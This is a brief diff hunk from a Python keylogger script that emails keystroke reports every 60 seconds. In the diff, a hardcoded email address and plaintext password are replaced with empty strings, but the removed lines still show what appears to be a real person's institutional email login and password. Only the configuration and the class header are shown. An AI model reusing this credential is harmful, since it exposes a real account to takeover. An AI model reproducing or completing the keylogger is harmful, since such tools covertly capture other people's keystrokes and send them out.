@@ -9,8 +9,8 @@ from email.mime.text import MIMEText
 
 #Add your own email address here. Does not work with Gmail. Preferably use outlook
 SEND_REPORT_EVERY = 60 # (in seconds)
-EMAIL_ADDRESS = "joy.awino@o365.strathmore.edu"
-EMAIL_PASSWORD = "Tg3M(qFEY:gVTm("
+EMAIL_ADDRESS = ""
+EMAIL_PASSWORD = ""
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
